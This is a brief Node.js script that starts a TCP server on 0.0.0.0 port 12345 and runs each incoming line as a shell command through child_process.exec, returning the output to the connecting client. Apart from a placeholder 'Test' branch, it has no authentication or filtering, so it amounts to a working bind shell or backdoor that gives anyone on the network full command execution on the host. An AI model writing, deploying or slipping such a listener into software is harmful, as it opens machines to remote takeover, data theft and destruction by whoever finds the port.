const net = require('net');
const { exec } = require('child_process');

const host = '0.0.0.0';
const port = 12345;

const server = net.createServer(socket => {
  console.log('Connection from:', socket.remoteAddress, 'port', socket.remotePort);

  socket.on('data', data => {
    const command = data.toString().trim();
    console.log('Received command:', command);
    
    if (command === 'Test') {
      console.log('...');
      // Add logic here
    } else {
      exec(command, (error, stdout) => {
        if (error) {
          socket.write('Error: ' + error.message);
        } else {
          socket.write(stdout);
        }
      });
    }
  });
  
  socket.on('close', () => {
    console.log('Connection closed');
  });
});

server.listen(port, host, () => {
  console.log('Server listening on', host, 'port', port);
});
